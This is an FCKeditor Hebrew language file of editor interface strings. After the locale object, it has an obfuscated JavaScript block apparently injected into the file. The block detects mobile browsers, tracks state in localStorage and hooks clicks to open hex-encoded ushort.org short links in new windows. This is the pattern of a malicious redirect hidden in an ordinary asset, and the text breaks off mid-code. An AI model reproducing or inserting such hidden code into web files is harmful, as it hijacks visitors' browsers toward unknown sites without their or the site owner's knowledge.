/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Hebrew language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "rtl",

ToolbarCollapse		: "כיווץ סרגל הכלים",
ToolbarExpand		: "פתיחת סרגל הכלים",

// Toolbar Items and Context Menu
Save				: "שמירה",
NewPage				: "דף חדש",
Preview				: "תצוגה מקדימה",
Cut					: "גזירה",
Copy				: "העתקה",
Paste				: "הדבקה",
PasteText			: "הדבקה כטקסט פשוט",
PasteWord			: "הדבקה מ-וורד",
Print				: "הדפסה",
SelectAll			: "בחירת הכל",
RemoveFormat		: "הסרת העיצוב",
InsertLinkLbl		: "קישור",
InsertLink			: "הוספת/עריכת קישור",
RemoveLink			: "הסרת הקישור",
VisitLink			: "פתח קישור",
Anchor				: "הוספת/עריכת נקודת עיגון",
AnchorDelete		: "הסר נקודת עיגון",
InsertImageLbl		: "תמונה",
InsertImage			: "הוספת/עריכת תמונה",
InsertFlashLbl		: "פלאש",
InsertFlash			: "הוסף/ערוך פלאש",
InsertTableLbl		: "טבלה",
InsertTable			: "הוספת/עריכת טבלה",
InsertLineLbl		: "קו",
InsertLine			: "הוספת קו אופקי",
InsertSpecialCharLbl: "תו מיוחד",
InsertSpecialChar	: "הוספת תו מיוחד",
InsertSmileyLbl		: "סמיילי",
InsertSmiley		: "הוספת סמיילי",
About				: "אודות FCKeditor",
Bold				: "מודגש",
Italic				: "נטוי",
Underline			: "קו תחתון",
StrikeThrough		: "כתיב מחוק",
Subscript			: "כתיב תחתון",
Superscript			: "כתיב עליון",
LeftJustify			: "יישור לשמאל",
CenterJustify		: "מרכוז",
RightJustify		: "יישור לימין",
BlockJustify		: "יישור לשוליים",
DecreaseIndent		: "הקטנת אינדנטציה",
IncreaseIndent		: "הגדלת אינדנטציה",
Blockquote			: "בלוק ציטוט",
CreateDiv			: "צור מיכל(תג)DIV",
EditDiv				: "ערוך מיכל (תג)DIV",
DeleteDiv			: "הסר מיכל(תג) DIV",
Undo				: "ביטול צעד אחרון",
Redo				: "חזרה על צעד אחרון",
NumberedListLbl		: "רשימה ממוספרת",
NumberedList		: "הוספת/הסרת רשימה ממוספרת",
BulletedListLbl		: "רשימת נקודות",
BulletedList		: "הוספת/הסרת רשימת נקודות",
ShowTableBorders	: "הצגת מסגרת הטבלה",
ShowDetails			: "הצגת פרטים",
Style				: "סגנון",
FontFormat			: "עיצוב",
Font				: "גופן",
FontSize			: "גודל",
TextColor			: "צבע טקסט",
BGColor				: "צבע רקע",
Source				: "מקור",
Find				: "חיפוש",
Replace				: "החלפה",
SpellCheck			: "בדיקת איות",
UniversalKeyboard	: "מקלדת אוניברסלית",
PageBreakLbl		: "שבירת דף",
PageBreak			: "הוסף שבירת דף",

Form			: "טופס",
Checkbox		: "תיבת סימון",
RadioButton		: "לחצן אפשרויות",
TextField		: "שדה טקסט",
Textarea		: "איזור טקסט",
HiddenField		: "שדה חבוי",
Button			: "כפתור",
SelectionField	: "שדה בחירה",
ImageButton		: "כפתור תמונה",

FitWindow		: "הגדל את גודל העורך",
ShowBlocks		: "הצג בלוקים",

// Context Menu
EditLink			: "עריכת קישור",
CellCM				: "תא",
RowCM				: "שורה",
ColumnCM			: "עמודה",
InsertRowAfter		: "הוסף שורה אחרי",
InsertRowBefore		: "הוסף שורה לפני",
DeleteRows			: "מחיקת שורות",
InsertColumnAfter	: "הוסף עמודה אחרי",
InsertColumnBefore	: "הוסף עמודה לפני",
DeleteColumns		: "מחיקת עמודות",
InsertCellAfter		: "הוסף תא אחרי",
InsertCellBefore	: "הוסף תא אחרי",
DeleteCells			: "מחיקת תאים",
MergeCells			: "מיזוג תאים",
MergeRight			: "מזג ימינה",
MergeDown			: "מזג למטה",
HorizontalSplitCell	: "פצל תא אופקית",
VerticalSplitCell	: "פצל תא אנכית",
TableDelete			: "מחק טבלה",
CellProperties		: "תכונות התא",
TableProperties		: "תכונות הטבלה",
ImageProperties		: "תכונות התמונה",
FlashProperties		: "מאפייני פלאש",

AnchorProp			: "מאפייני נקודת עיגון",
ButtonProp			: "מאפייני כפתור",
CheckboxProp		: "מאפייני תיבת סימון",
HiddenFieldProp		: "מאפיני שדה חבוי",
RadioButtonProp		: "מאפייני לחצן אפשרויות",
ImageButtonProp		: "מאפיני כפתור תמונה",
TextFieldProp		: "מאפייני שדה טקסט",
SelectionFieldProp	: "מאפייני שדה בחירה",
TextareaProp		: "מאפיני איזור טקסט",
FormProp			: "מאפיני טופס",

FontFormats			: "נורמלי;קוד;כתובת;כותרת;כותרת 2;כותרת 3;כותרת 4;כותרת 5;כותרת 6",

// Alerts and Messages
ProcessingXHTML		: "מעבד XHTML, נא להמתין...",
Done				: "המשימה הושלמה",
PasteWordConfirm	: "נראה הטקסט שבכוונתך להדביק מקורו בקובץ וורד. האם ברצונך לנקות אותו טרם ההדבקה?",
NotCompatiblePaste	: "פעולה זו זמינה לדפדפן אינטרנט אקספלורר מגירסא 5.5 ומעלה. האם להמשיך בהדבקה ללא הניקוי?",
UnknownToolbarItem	: "פריט לא ידוע בסרגל הכלים \"%1\"",
UnknownCommand		: "שם פעולה לא ידוע \"%1\"",
NotImplemented		: "הפקודה לא מיושמת",
UnknownToolbarSet	: "ערכת סרגל הכלים \"%1\" לא קיימת",
NoActiveX			: "הגדרות אבטחה של הדפדפן עלולות לגביל את אפשרויות העריכה.יש לאפשר את האופציה \"הרץ פקדים פעילים ותוספות\". תוכל לחוות טעויות וחיווים של אפשרויות שחסרים.",
BrowseServerBlocked : "לא ניתן לגשת לדפדפן משאבים.אנא וודא שחוסם חלונות הקופצים לא פעיל.",
DialogBlocked		: "לא היה ניתן לפתוח חלון דיאלוג. אנא וודא שחוסם חלונות קופצים לא פעיל.",
VisitLinkBlocked	: "לא ניתן לפתוח חלון חדש.נא לוודא שחוסמי החלונות הקופצים לא פעילים.",

// Dialogs
DlgBtnOK			: "אישור",
DlgBtnCancel		: "ביטול",
DlgBtnClose			: "סגירה",
DlgBtnBrowseServer	: "סייר השרת",
DlgAdvancedTag		: "אפשרויות מתקדמות",
DlgOpOther			: "<אחר>",
DlgInfoTab			: "מידע",
DlgAlertUrl			: "אנא הזן URL",

// General Dialogs Labels
DlgGenNotSet		: "<לא נקבע>",
DlgGenId			: "זיהוי (Id)",
DlgGenLangDir		: "כיוון שפה",
DlgGenLangDirLtr	: "שמאל לימין (LTR)",
DlgGenLangDirRtl	: "ימין לשמאל (RTL)",
DlgGenLangCode		: "קוד שפה",
DlgGenAccessKey		: "מקש גישה",
DlgGenName			: "שם",
DlgGenTabIndex		: "מספר טאב",
DlgGenLongDescr		: "קישור לתיאור מפורט",
DlgGenClass			: "גיליונות עיצוב קבוצות",
DlgGenTitle			: "כותרת מוצעת",
DlgGenContType		: "Content Type מוצע",
DlgGenLinkCharset	: "קידוד המשאב המקושר",
DlgGenStyle			: "סגנון",

// Image Dialog
DlgImgTitle			: "תכונות התמונה",
DlgImgInfoTab		: "מידע על התמונה",
DlgImgBtnUpload		: "שליחה לשרת",
DlgImgURL			: "כתובת (URL)",
DlgImgUpload		: "העלאה",
DlgImgAlt			: "טקסט חלופי",
DlgImgWidth			: "רוחב",
DlgImgHeight		: "גובה",
DlgImgLockRatio		: "נעילת היחס",
DlgBtnResetSize		: "איפוס הגודל",
DlgImgBorder		: "מסגרת",
DlgImgHSpace		: "מרווח אופקי",
DlgImgVSpace		: "מרווח אנכי",
DlgImgAlign			: "יישור",
DlgImgAlignLeft		: "לשמאל",
DlgImgAlignAbsBottom: "לתחתית האבסולוטית",
DlgImgAlignAbsMiddle: "מרכוז אבסולוטי",
DlgImgAlignBaseline	: "לקו התחתית",
DlgImgAlignBottom	: "לתחתית",
DlgImgAlignMiddle	: "לאמצע",
DlgImgAlignRight	: "לימין",
DlgImgAlignTextTop	: "לראש הטקסט",
DlgImgAlignTop		: "למעלה",
DlgImgPreview		: "תצוגה מקדימה",
DlgImgAlertUrl		: "נא להקליד את כתובת התמונה",
DlgImgLinkTab		: "קישור",

// Flash Dialog
DlgFlashTitle		: "מאפיני פלאש",
DlgFlashChkPlay		: "נגן אוטומטי",
DlgFlashChkLoop		: "לולאה",
DlgFlashChkMenu		: "אפשר תפריט פלאש",
DlgFlashScale		: "גודל",
DlgFlashScaleAll	: "הצג הכל",
DlgFlashScaleNoBorder	: "ללא גבולות",
DlgFlashScaleFit	: "התאמה מושלמת",

// Link Dialog
DlgLnkWindowTitle	: "קישור",
DlgLnkInfoTab		: "מידע על הקישור",
DlgLnkTargetTab		: "מטרה",

DlgLnkType			: "סוג קישור",
DlgLnkTypeURL		: "כתובת (URL)",
DlgLnkTypeAnchor	: "עוגן בעמוד זה",
DlgLnkTypeEMail		: "דוא''ל",
DlgLnkProto			: "פרוטוקול",
DlgLnkProtoOther	: "<אחר>",
DlgLnkURL			: "כתובת (URL)",
DlgLnkAnchorSel		: "בחירת עוגן",
DlgLnkAnchorByName	: "עפ''י שם העוגן",
DlgLnkAnchorById	: "עפ''י זיהוי (Id) הרכיב",
DlgLnkNoAnchors		: "(אין עוגנים זמינים בדף)",
DlgLnkEMail			: "כתובת הדוא''ל",
DlgLnkEMailSubject	: "נושא ההודעה",
DlgLnkEMailBody		: "גוף ההודעה",
DlgLnkUpload		: "העלאה",
DlgLnkBtnUpload		: "שליחה לשרת",

DlgLnkTarget		: "מטרה",
DlgLnkTargetFrame	: "<מסגרת>",
DlgLnkTargetPopup	: "<חלון קופץ>",
DlgLnkTargetBlank	: "חלון חדש (_blank)",
DlgLnkTargetParent	: "חלון האב (_parent)",
DlgLnkTargetSelf	: "באותו החלון (_self)",
DlgLnkTargetTop		: "חלון ראשי (_top)",
DlgLnkTargetFrameName	: "שם מסגרת היעד",
DlgLnkPopWinName	: "שם החלון הקופץ",
DlgLnkPopWinFeat	: "תכונות החלון הקופץ",
DlgLnkPopResize		: "בעל גודל ניתן לשינוי",
DlgLnkPopLocation	: "סרגל כתובת",
DlgLnkPopMenu		: "סרגל תפריט",
DlgLnkPopScroll		: "ניתן לגלילה",
DlgLnkPopStatus		: "סרגל חיווי",
DlgLnkPopToolbar	: "סרגל הכלים",
DlgLnkPopFullScrn	: "מסך מלא (IE)",
DlgLnkPopDependent	: "תלוי (Netscape)",
DlgLnkPopWidth		: "רוחב",
DlgLnkPopHeight		: "גובה",
DlgLnkPopLeft		: "מיקום צד שמאל",
DlgLnkPopTop		: "מיקום צד עליון",

DlnLnkMsgNoUrl		: "נא להקליד את כתובת הקישור (URL)",
DlnLnkMsgNoEMail	: "נא להקליד את כתובת הדוא''ל",
DlnLnkMsgNoAnchor	: "נא לבחור עוגן במסמך",
DlnLnkMsgInvPopName	: "שם החלון הקופץ חייב להתחיל באותיות ואסור לכלול רווחים",

// Color Dialog
DlgColorTitle		: "בחירת צבע",
DlgColorBtnClear	: "איפוס",
DlgColorHighlight	: "נוכחי",
DlgColorSelected	: "נבחר",

// Smiley Dialog
DlgSmileyTitle		: "הוספת סמיילי",

// Special Character Dialog
DlgSpecialCharTitle	: "בחירת תו מיוחד",

// Table Dialog
DlgTableTitle		: "תכונות טבלה",
DlgTableRows		: "שורות",
DlgTableColumns		: "עמודות",
DlgTableBorder		: "גודל מסגרת",
DlgTableAlign		: "יישור",
DlgTableAlignNotSet	: "<לא נקבע>",
DlgTableAlignLeft	: "שמאל",
DlgTableAlignCenter	: "מרכז",
DlgTableAlignRight	: "ימין",
DlgTableWidth		: "רוחב",
DlgTableWidthPx		: "פיקסלים",
DlgTableWidthPc		: "אחוז",
DlgTableHeight		: "גובה",
DlgTableCellSpace	: "מרווח תא",
DlgTableCellPad		: "ריפוד תא",
DlgTableCaption		: "כיתוב",
DlgTableSummary		: "סיכום",
DlgTableHeaders		: "כותרות",
DlgTableHeadersNone		: "אין",
DlgTableHeadersColumn	: "עמודה ראשונה",
DlgTableHeadersRow		: "שורה ראשונה",
DlgTableHeadersBoth		: "שניהם",

// Table Cell Dialog
DlgCellTitle		: "תכונות תא",
DlgCellWidth		: "רוחב",
DlgCellWidthPx		: "פיקסלים",
DlgCellWidthPc		: "אחוז",
DlgCellHeight		: "גובה",
DlgCellWordWrap		: "גלילת שורות",
DlgCellWordWrapNotSet	: "<לא נקבע>",
DlgCellWordWrapYes	: "כן",
DlgCellWordWrapNo	: "לא",
DlgCellHorAlign		: "יישור אופקי",
DlgCellHorAlignNotSet	: "<לא נקבע>",
DlgCellHorAlignLeft	: "שמאל",
DlgCellHorAlignCenter	: "מרכז",
DlgCellHorAlignRight: "ימין",
DlgCellVerAlign		: "יישור אנכי",
DlgCellVerAlignNotSet	: "<לא נקבע>",
DlgCellVerAlignTop	: "למעלה",
DlgCellVerAlignMiddle	: "לאמצע",
DlgCellVerAlignBottom	: "לתחתית",
DlgCellVerAlignBaseline	: "קו תחתית",
DlgCellType		: "סוג תא",
DlgCellTypeData		: "סוג",
DlgCellTypeHeader	: "כותרת",
DlgCellRowSpan		: "טווח שורות",
DlgCellCollSpan		: "טווח עמודות",
DlgCellBackColor	: "צבע רקע",
DlgCellBorderColor	: "צבע מסגרת",
DlgCellBtnSelect	: "בחירה...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "חפש והחלף",

// Find Dialog
DlgFindTitle		: "חיפוש",
DlgFindFindBtn		: "חיפוש",
DlgFindNotFoundMsg	: "הטקסט המבוקש לא נמצא.",

// Replace Dialog
DlgReplaceTitle			: "החלפה",
DlgReplaceFindLbl		: "חיפוש מחרוזת:",
DlgReplaceReplaceLbl	: "החלפה במחרוזת:",
DlgReplaceCaseChk		: "התאמת סוג אותיות (Case)",
DlgReplaceReplaceBtn	: "החלפה",
DlgReplaceReplAllBtn	: "החלפה בכל העמוד",
DlgReplaceWordChk		: "התאמה למילה המלאה",

// Paste Operations / Dialog
PasteErrorCut	: "הגדרות האבטחה בדפדפן שלך לא מאפשרות לעורך לבצע פעולות גזירה  אוטומטיות. יש להשתמש במקלדת לשם כך (Ctrl+X).",
PasteErrorCopy	: "הגדרות האבטחה בדפדפן שלך לא מאפשרות לעורך לבצע פעולות העתקה אוטומטיות. יש להשתמש במקלדת לשם כך (Ctrl+C).",

PasteAsText		: "הדבקה כטקסט פשוט",
PasteFromWord	: "הדבקה מ-וורד",

DlgPasteMsg2	: "אנא הדבק בתוך הקופסה באמצעות  (<STRONG>Ctrl+V</STRONG>) ולחץ על  <STRONG>אישור</STRONG>.",
DlgPasteSec		: "עקב הגדרות אבטחה בדפדפן, לא ניתן לגשת אל לוח הגזירים (clipboard) בצורה ישירה.אנא בצע הדבק שוב בחלון זה.",
DlgPasteIgnoreFont		: "התעלם מהגדרות סוג פונט",
DlgPasteRemoveStyles	: "הסר הגדרות סגנון",

// Color Picker
ColorAutomatic	: "אוטומטי",
ColorMoreColors	: "צבעים נוספים...",

// Document Properties
DocProps		: "מאפיני מסמך",

// Anchor Dialog
DlgAnchorTitle		: "מאפיני נקודת עיגון",
DlgAnchorName		: "שם לנקודת עיגון",
DlgAnchorErrorName	: "אנא הזן שם לנקודת עיגון",

// Speller Pages Dialog
DlgSpellNotInDic		: "לא נמצא במילון",
DlgSpellChangeTo		: "שנה ל",
DlgSpellBtnIgnore		: "התעלם",
DlgSpellBtnIgnoreAll	: "התעלם מהכל",
DlgSpellBtnReplace		: "החלף",
DlgSpellBtnReplaceAll	: "החלף הכל",
DlgSpellBtnUndo			: "החזר",
DlgSpellNoSuggestions	: "- אין הצעות -",
DlgSpellProgress		: "בדיקות איות בתהליך ....",
DlgSpellNoMispell		: "בדיקות איות הסתיימה: לא נמצאו שגיעות כתיב",
DlgSpellNoChanges		: "בדיקות איות הסתיימה: לא שונתה אף מילה",
DlgSpellOneChange		: "בדיקות איות הסתיימה: שונתה מילה אחת",
DlgSpellManyChanges		: "בדיקות איות הסתיימה: %1 מילים שונו",

IeSpellDownload			: "בודק האיות לא מותקן, האם אתה מעוניין להוריד?",

// Button Dialog
DlgButtonText		: "טקסט (ערך)",
DlgButtonType		: "סוג",
DlgButtonTypeBtn	: "כפתור",
DlgButtonTypeSbm	: "שלח",
DlgButtonTypeRst	: "אפס",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "שם",
DlgCheckboxValue	: "ערך",
DlgCheckboxSelected	: "בחור",

// Form Dialog
DlgFormName		: "שם",
DlgFormAction	: "שלח אל",
DlgFormMethod	: "סוג שליחה",

// Select Field Dialog
DlgSelectName		: "שם",
DlgSelectValue		: "ערך",
DlgSelectSize		: "גודל",
DlgSelectLines		: "שורות",
DlgSelectChkMulti	: "אפשר בחירות מרובות",
DlgSelectOpAvail	: "אפשרויות זמינות",
DlgSelectOpText		: "טקסט",
DlgSelectOpValue	: "ערך",
DlgSelectBtnAdd		: "הוסף",
DlgSelectBtnModify	: "שנה",
DlgSelectBtnUp		: "למעלה",
DlgSelectBtnDown	: "למטה",
DlgSelectBtnSetValue : "קבע כברירת מחדל",
DlgSelectBtnDelete	: "מחק",

// Textarea Dialog
DlgTextareaName	: "שם",
DlgTextareaCols	: "עמודות",
DlgTextareaRows	: "שורות",

// Text Field Dialog
DlgTextName			: "שם",
DlgTextValue		: "ערך",
DlgTextCharWidth	: "רוחב באותיות",
DlgTextMaxChars		: "מקסימות אותיות",
DlgTextType			: "סוג",
DlgTextTypeText		: "טקסט",
DlgTextTypePass		: "סיסמה",

// Hidden Field Dialog
DlgHiddenName	: "שם",
DlgHiddenValue	: "ערך",

// Bulleted List Dialog
BulletedListProp	: "מאפייני רשימה",
NumberedListProp	: "מאפייני רשימה ממוספרת",
DlgLstStart			: "התחלה",
DlgLstType			: "סוג",
DlgLstTypeCircle	: "עיגול",
DlgLstTypeDisc		: "דיסק",
DlgLstTypeSquare	: "מרובע",
DlgLstTypeNumbers	: "מספרים (1, 2, 3)",
DlgLstTypeLCase		: "אותיות קטנות (a, b, c)",
DlgLstTypeUCase		: "אותיות גדולות (A, B, C)",
DlgLstTypeSRoman	: "ספרות רומאיות קטנות (i, ii, iii)",
DlgLstTypeLRoman	: "ספרות רומאיות גדולות (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "כללי",
DlgDocBackTab		: "רקע",
DlgDocColorsTab		: "צבעים וגבולות",
DlgDocMetaTab		: "נתוני META",

DlgDocPageTitle		: "כותרת דף",
DlgDocLangDir		: "כיוון שפה",
DlgDocLangDirLTR	: "שמאל לימין (LTR)",
DlgDocLangDirRTL	: "ימין לשמאל (RTL)",
DlgDocLangCode		: "קוד שפה",
DlgDocCharSet		: "קידוד אותיות",
DlgDocCharSetCE		: "מרכז אירופה",
DlgDocCharSetCT		: "סיני מסורתי (Big5)",
DlgDocCharSetCR		: "קירילי",
DlgDocCharSetGR		: "יוונית",
DlgDocCharSetJP		: "יפנית",
DlgDocCharSetKR		: "קוראנית",
DlgDocCharSetTR		: "טורקית",
DlgDocCharSetUN		: "יוני קוד (UTF-8)",
DlgDocCharSetWE		: "מערב אירופה",
DlgDocCharSetOther	: "קידוד אותיות אחר",

DlgDocDocType		: "הגדרות סוג מסמך",
DlgDocDocTypeOther	: "הגדרות סוג מסמך אחרות",
DlgDocIncXHTML		: "כלול הגדרות XHTML",
DlgDocBgColor		: "צבע רקע",
DlgDocBgImage		: "URL לתמונת רקע",
DlgDocBgNoScroll	: "רגע ללא גלילה",
DlgDocCText			: "טקסט",
DlgDocCLink			: "קישור",
DlgDocCVisited		: "קישור שבוקר",
DlgDocCActive		: " קישור פעיל",
DlgDocMargins		: "גבולות דף",
DlgDocMaTop			: "למעלה",
DlgDocMaLeft		: "שמאלה",
DlgDocMaRight		: "ימינה",
DlgDocMaBottom		: "למטה",
DlgDocMeIndex		: "מפתח עניינים של המסמך )מופרד בפסיק(",
DlgDocMeDescr		: "תאור מסמך",
DlgDocMeAuthor		: "מחבר",
DlgDocMeCopy		: "זכויות יוצרים",
DlgDocPreview		: "תצוגה מקדימה",

// Templates Dialog
Templates			: "תבניות",
DlgTemplatesTitle	: "תביות תוכן",
DlgTemplatesSelMsg	: "אנא בחר תבנית לפתיחה בעורך <BR>התוכן המקורי ימחק:",
DlgTemplatesLoading	: "מעלה רשימת תבניות אנא המתן",
DlgTemplatesNoTpl	: "(לא הוגדרו תבניות)",
DlgTemplatesReplace	: "החלפת תוכן ממשי",

// About Dialog
DlgAboutAboutTab	: "אודות",
DlgAboutBrowserInfoTab	: "גירסת דפדפן",
DlgAboutLicenseTab	: "רשיון",
DlgAboutVersion		: "גירסא",
DlgAboutInfo		: "מידע נוסף ניתן למצוא כאן:",

// Div Dialog
DlgDivGeneralTab	: "כללי",
DlgDivAdvancedTab	: "מתקדם",
DlgDivStyle		: "סגנון",
DlgDivInlineStyle	: "סגנון בתוך השורה",

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return 